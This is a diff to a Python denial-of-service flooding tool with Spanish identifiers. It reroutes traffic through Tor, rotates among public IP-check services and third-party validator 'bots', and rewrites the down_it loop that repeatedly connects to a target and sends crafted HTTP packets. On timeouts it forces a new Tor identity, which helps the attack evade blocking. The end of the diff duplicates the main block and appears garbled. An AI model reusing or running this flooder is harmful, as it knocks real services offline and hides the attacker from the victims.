@@ -21,8 +21,7 @@ elif language == "default":
     pass
 else:
     from language import leng_default as idioma
-    pass
-    
+    pass    
 
 parametros_defecto_leng = idioma.parametros_defecto_leng
 asociado_puerto_leng = idioma.asociado_puerto_leng
@@ -53,6 +52,7 @@ ej_leng = idioma.ej_leng
 ejemplo_leng = idioma.ejemplo_leng
 estado_leng = idioma.estado_leng
 error500_leng = idioma.error500_leng
+forzar_identidad = idioma.forzar_identidad
 host_cerrado_leng = idioma.host_cerrado_leng
 info_leng = idioma.info_leng
 inexistente_leng = idioma.inexistente_leng
@@ -69,6 +69,7 @@ nota_leng = idioma.nota_leng
 obligatorio_leng2 = idioma.obligatorio_leng2
 no_tor_instalado_leng = idioma.no_tor_instalado_leng
 nuevo_agente_leng = idioma.nuevo_agente_leng
+nueva_ip_asignada = idioma.nueva_ip_asignada
 o_leng = idioma.o_leng
 opciones_leng = idioma.opciones_leng
 puerto_a_usar_leng = idioma.puerto_a_usar_leng
@@ -100,7 +101,9 @@ verifique_leng = idioma.verifique_leng
 web_ip = idioma.web_ip
 web_invalido_leng = idioma.web_invalido_leng
 window = idioma.window
+
 pu = "\n ---------------------------------------------------- \n"
+
 check_pip_config  = conf.check_pip_config 
 if check_pip_config == "yes":
     from libraries import modules as lib
@@ -109,6 +112,8 @@ if check_pip_config == "yes":
     print( pu + revisar_pip_leng + "." + pu)
     lib.pip_inst()
     lib.clear()
+else:
+    pass
 
 check_tor_config = conf.check_tor_conf
 if check_tor_config == "yes":
@@ -123,7 +128,9 @@ if check_tor_config == "yes":
     torEX.tor_run()
     torEX.apt_transport_https()
     lib.clear()
-    
+else:
+    pass
+
 check_libraries = conf.check_libraries_conf
 if check_libraries == "yes":
     from libraries import modules as lib
@@ -180,10 +187,22 @@ import random
 from os import system, name
 import os
 
-
 ipcheck_url1_conf = conf.ipcheck_url1_conf
 ipcheck_url2_conf = conf.ipcheck_url2_conf
+ipcheck_url3_conf = conf.ipcheck_url3_conf
+ipcheck_url4_conf = conf.ipcheck_url4_conf
+ipcheck_url5_conf = conf.ipcheck_url5_conf
+ipcheck_url6_conf = conf.ipcheck_url6_conf
+ipcheck_url7_conf = conf.ipcheck_url7_conf
+
+bot_url1_conf = conf.bot_url1_conf
+bot_url2_conf = conf.bot_url2_conf
+bot_url3_conf = conf.bot_url3_conf
+bot_url4_conf = conf.bot_url4_conf
+bot_url5_conf = conf.bot_url5_conf
+
 headers_conf = conf.headers_conf
+
 BC = Back.CYAN
 BM = Back.MAGENTA
 BR = Back.RED
@@ -217,6 +236,7 @@ rr = hh + SR
 ix = SR + FG + SB
 ec = SR + cc
 sg = SR + gg
+timeout = int(10)
 
 def clear():
     if name == 'nt':
@@ -245,7 +265,6 @@ print(bb + clientes_leng + ec + "[50]                                       " + 
 print(bb + metodo_leng + ec + "  [Random]                                   " + SR)
 print(bb + "Tor: " + ec + desactivado_leng + SR)
 print(BM + "                                                     \n" + SR)
-
 
 print(aa + "....................................................." + SR)
 pa_txt = gg + "1" + ll + "/5"
@@ -286,7 +305,6 @@ if host == "ERROR":
     print(gg + " " + info_leng + ": " + jj + "Error --> " + hh + inexistente_leng + SR)
     print(gg + " " + info_leng + ": " + kk + adios_leng + SR)
     sys.exit()
-
 
 clear()
 print(aa + "....................................................." + SR)
@@ -473,30 +491,46 @@ def my_bots():
 	print(gg + " " + info_leng + ": " + hh + comprobando_leng + ": " + mm + bots_verificadores_leng + SR)
 	global bots
 	bots = []
-	bots.append("https://html5.validator.nu/?doc=")
-	bots.append("https://validator.w3.org/nu/?doc=")
-	bots.append("https://datayze.com/site-validator.php?domain=")
-	bots.append("https://validator.ampproject.org/#url=")
-	bots.append("http://www.feedvalidator.org/check.cgi?url=")
+	bots.append(bot_url1_conf) #https://html5.validator.nu/?doc=
+	bots.append(bot_url2_conf) # https://validator.w3.org/nu/?doc=
+	bots.append(bot_url3_conf) # https://datayze.com/site-validator.php?domain=
+	bots.append(bot_url4_conf) # https://validator.ampproject.org/#url=
+	bots.append(bot_url5_conf) # http://www.feedvalidator.org/check.cgi?url=
 	print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
 	return(bots)
+
+def ipchecker_url():
+    print(gg + " " + info_leng + ": " + hh + comprobando_leng + ": " + mm + "Ip-Checker" + SR)
+    global multichecker
+    multichecker = []
+    multichecker.append(ipcheck_url1_conf) # http://icanhazip.com
+    multichecker.append(ipcheck_url2_conf) # http://icanhazptr.com
+    multichecker.append(ipcheck_url3_conf) # https://ifconfig.me/ip
+    multichecker.append(ipcheck_url4_conf) # https://ipinfo.io/ip
+    multichecker.append(ipcheck_url5_conf) # https://ipecho.net/plain
+    multichecker.append(ipcheck_url6_conf) # http://ident.me/
+    multichecker.append(ipcheck_url7_conf) # http://checkip.amazonaws.com/
+    print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
+    return(multichecker)
 
 def conec_tor():
     if tor is True:
         print(gg + " " + info_leng + ": " + hh + comprobando_leng + ": " + mm + seguridad_ip_leng + SR)        
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
-        socket.socket = socks.socksocket
+        socket.socket = socks.socksocket        
         try:
-            tor_ip = requests.get(ipcheck_url1_conf)
+            ip_checker = random.choice(multichecker)
+            tor_ip = requests.get(str(ip_checker))
             tor_ip = str(tor_ip.text)
-            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + "01 --> " + ix + ipcheck_url1_conf + rr)
+            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + " --> " + ix + ip_checker + rr)
             print(gg + " " + info_leng + ": " + hh + estado_leng + ": " + ip_asignada_leng + SR)
             print(gg + " " + info_leng + ": " + hh + ip_segura_leng + ": " + mm + tor_ip + SR)
             print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
         except requests.exceptions.ConnectionError as errc:
-            tor_ip = requests.get(ipcheck_url2_conf)
+            ip_checker = random.choice(multichecker)
+            tor_ip = requests.get(str(ip_checker))
             tor_ip = str(tor_ip.text)
-            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + "02 --> " + ix + ipcheck_url2_conf + rr)
+            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + " --> " + ix + ip_checker + rr)
             print(gg + " " + info_leng + ": " + hh + estado_leng + ": " + ip_asignada_leng + SR)
             print(gg + " " + info_leng + ": " + hh + ip_segura_leng + ": " + mm + tor_ip + SR)
             print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
@@ -506,19 +540,21 @@ def conec_tor():
             time.sleep(7)
             sys.exit(0)
     if tor is False:
-        print(gg + " " + info_leng + ": " + hh + comprobando_leng + ": " + mm + seguridad_ip_leng + SR)        
+        print(gg + " " + info_leng + ": " + hh + comprobando_leng + ": " + mm + seguridad_ip_leng + SR)              
         try:
-            regular_ip = requests.get(ipcheck_url1_conf)
+            ip_checker = random.choice(multichecker)
+            regular_ip = requests.get(str(ip_checker))            
             regular_ip = str(regular_ip.text)
-            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + "01 --> " + ix + ipcheck_url1_conf + rr)
+            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + " --> " + ix + ip_checker + rr)
             print(gg + " " + info_leng + ": " + nn + ip_expuesta_leng + ": " + mm + regular_ip + SR)
             print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
             print(gg + " " + info_leng + ": " + nn + "--> " + SR  + gg + use_vpn_leng + ".\n" + SR)
             continuar()
         except requests.exceptions.ConnectionError as errc:
-            regular_ip = requests.get(ipcheck_url2_conf)
+            ip_checker = random.choice(multichecker)
+            regular_ip = requests.get(str(ip_checker))
             regular_ip = str(regular_ip.text)
-            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + "01 --> "  + ix + ipcheck_url2_conf + rr)
+            print(ff + " " + nota_leng + ": " + hh + servidor_ip_leng + ": " + mm + " --> "  + ix + ip_checker + rr)
             print(gg + " " + info_leng + ": " + nn + ip_expuesta_leng + ": " + mm + regular_ip + SR)
             print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
             print(gg + " " + info_leng + ": " + nn + "--> " + sg + use_vpn_leng + ".\n" + SR)
@@ -531,14 +567,14 @@ def continuar():
     if cont is None:
         print("n")
         sys.exit()
-    if cont == s_leng:
+    if cont == s_leng or cont == "s" or cont == "si" or cont == "S" or cont == "Si" or cont == "SI" or cont == "y" or cont == "yes" or cont == "Y" or cont == "Yes" or cont == "YES":
         pass
     else:
         print("n")
         sys.exit()
         
 def user_agent():
-	print(gg + " " + info_leng + ": " + hh + comprobando_leng + " " + mm + uagent_leng + SR)
+	print(gg + " " + info_leng + ": " + hh + comprobando_leng + ": " + mm + uagent_leng + SR)
 	global uagent
 	uagent = []
 	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)")
@@ -611,33 +647,39 @@ def bot_reconextando(url):
 	except:
 		time.sleep(.1)
 
-def down_it(item):
-	try:
-		while True:
-			global met
-			if met == "Random":
-				met = str(random.choice(mmetodo))
-			packet = str(met + " / HTTP/1.1\nHost: " + http + host + "\n\n User-Agent: " + str(random.choice(uagent)) + "\n" + data).encode('utf-8')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((host,int(port)))
-			puerto = str(port)
-			print (ff + " " + nota_leng + ": " + hh + " " + conectando_cliente_leng + ": " + mm +  host + sg + ":" + mm + puerto + sg + " / " + mm + met + SR)
-			if s.sendto( packet, (host, int(port)) ):
-				s.shutdown(1)
-				print (gg + " " + info_leng + ": " + pp + " -->" + ix + " " + paquete_enviado_leng + " ... " + pp + "<--" + ix + " OK.." + SR)
-			else:
-				s.shutdown(1)
-				print(gg + " " + info_leng + ": " + pp + "-->" + nn + " " + paquete_no_enviado_leng + " !!!" + pp + "<--" + SR)
-			time.sleep(.1)
-	except socket.error as e:
-		print(gg + " " + info_leng + ": " + nn + " " + error500_leng + " : " + mm + str(host) + nn + " " + caido_protegido_leng + SR)
-		print(ff + " " + nota_leng + ": " + hh + " " + para_terminar_leng + " " + nn + "[Ctrl + C] " + hh + o_leng + nn + " [Ctrl + Z]" + SR)
-		#Intento de nuevo Ip tor ---> falta probarlo		
-		#print(" " + nota_leng + ": " + "Forzando Nueva Identidad")		
-		#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1',9050)
-		#socket.socket = socket.socksocket
-		#print (" " + nota_leng + ": " + "Nueva Identidad asignada...")        
-		time.sleep(1) #defecto .1   
+def down_it(item):    
+    try:
+        while True:
+            global met
+            if met == "Random":
+                met = str(random.choice(mmetodo))
+            packet = str(met + " / HTTP/1.1\nHost: " + http + host + "\n\n User-Agent: " + str(random.choice(uagent)) + "\n" + data).encode('utf-8')
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                         
+            s.connect((host,int(port)))
+            puerto = str(port)
+            print (ff + " " + nota_leng + ": " + hh + " " + conectando_cliente_leng + ": " + mm +  host + sg + ":" + mm + puerto + sg + " / " + mm + met + SR)
+            if s.sendto( packet, (host, int(port)) ):
+                s.shutdown(1)
+                print (gg + " " + info_leng + ": " + pp + " -->" + ix + " " + paquete_enviado_leng + " ... " + pp + "<--" + ix + " OK.." + SR)
+            else:
+                s.shutdown(1)
+                print(gg + " " + info_leng + ": " + pp + "-->" + nn + " " + paquete_no_enviado_leng + " !!!" + pp + "<--" + SR)
+                time.sleep(.1)
+    #------------ TIME OUT--- En modo TESTEO EXPERIMENTAL
+    except socket.timeout:
+        print(gg + " " + info_leng + ": " + nn + " " + "ERROR 504 TimeOut" + " : " + mm + str(host) + nn + " " + caido_protegido_leng + SR)
+        print(ff + " " + nota_leng + ": " + hh + " " + para_terminar_leng + " " + nn + "[Ctrl + C] " + hh + o_leng + nn + " [Ctrl + Z]" + SR)                
+        time.sleep(1)         
+        print(ff + " " + nota_leng + ": " + hh + forzar_identidad)        
+        conec_tor()        
+        #-------------------------------
+        time.sleep(1)     
+    except socket.error as e:
+        print(gg + " " + info_leng + ": " + nn + " " + error500_leng + " : " + mm + str(host) + nn + " " + caido_protegido_leng + SR)
+        print(ff + " " + nota_leng + ": " + hh + " " + para_terminar_leng + " " + nn + "[Ctrl + C] " + hh + o_leng + nn + " [Ctrl + Z]" + SR)        
+        print(ff + " " + nota_leng + ": " + hh + forzar_identidad)        
+        conec_tor()        
+        time.sleep(1)   
 
 def dos():
 	while True:
@@ -695,17 +737,17 @@ def iniciando():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host,int(port)))
         s.settimeout(1)
-        print(gg + " " + info_leng + ": " + hh + " " + target_leng + ": " + mm + str(host) + SR)
-        print(ff + " " + nota_leng + ": " + hh + " " + estado_leng + ": " + ix + "OK.." + SR)
-        print(gg + " " + info_leng + ": " + hh + " " + puerto2_leng + ": " + mm + str(port) + SR)
-        print(ff + " " + nota_leng + ": " + hh + " " + estado_leng + ": " + ix + "OK.." + SR)
+        print(gg + " " + info_leng + ": " + hh + target_leng + ": " + mm + str(host) + SR)
+        print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
+        print(gg + " " + info_leng + ": " + hh + puerto2_leng + ": " + mm + str(port) + SR)
+        print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + ix + "OK.." + SR)
     except socket.error as e:
-        print(gg + " " + info_leng + ": " + hh + " " + target_leng + ": " + mm + str(host) + SR)
-        print(ff + " " + nota_leng + ": " + hh + " " + estado_leng + ": " + nn + "ERROR.. " + imp_hand_leng + SR)
-        print(gg + " " + info_leng + ": " + hh + " " + puerto2_leng + ": " + mm + str(port) + SR)
-        print(ff + " " + nota_leng + ": " + hh + " " + estado_leng + ": " + nn + "ERROR.. " + puerto_no_leng + ": " + str(host) + SR)        
-        print(gg + " " + info_leng + ": " + qq + " " + verifique_leng + SR)
-        print(ff + " " + nota_leng + ": " + qq + " " + host_cerrado_leng + SR + "\n")
+        print(gg + " " + info_leng + ": " + hh + target_leng + ": " + mm + str(host) + SR)
+        print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + nn + "ERROR.. " + imp_hand_leng + SR)
+        print(gg + " " + info_leng + ": " + hh + puerto2_leng + ": " + mm + str(port) + SR)
+        print(ff + " " + nota_leng + ": " + hh + estado_leng + ": " + nn + "ERROR.. " + puerto_no_leng + ": " + str(host) + SR)        
+        print(gg + " " + info_leng + ": " + qq + verifique_leng + SR)
+        print(ff + " " + nota_leng + ": " + qq + host_cerrado_leng + SR + "\n")
         time.sleep(1)
         sys.exit(0)
 def ini(): 
@@ -717,10 +759,19 @@ def ini():
     time.sleep(1)
     my_bots()
     time.sleep(1)
+    ipchecker_url()
+    time.sleep(1)
+    country_palce()
+    time.sleep(1)
     conec_tor()
     time.sleep(1)
     iniciando()
     time.sleep(1)
+    selector()
+
+if __name__ == '__main__':
+    ini()
+
     selector()
 
 if __name__ == '__main__':
